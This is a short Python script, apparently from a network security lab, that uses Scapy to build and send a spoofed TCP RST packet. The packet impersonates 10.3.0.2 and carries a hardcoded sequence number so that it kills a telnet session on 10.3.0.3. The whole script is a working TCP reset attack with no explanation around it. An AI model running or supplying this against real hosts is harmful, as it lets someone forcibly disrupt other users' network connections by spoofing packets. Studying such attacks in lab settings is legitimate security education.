#!/usr/bin/env python3
from scapy.all import IP, TCP, send, ls

ip = IP(src="10.3.0.2", dst="10.3.0.3")
tcp = TCP(sport=56626, dport=23, flags="R", seq=118018413)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)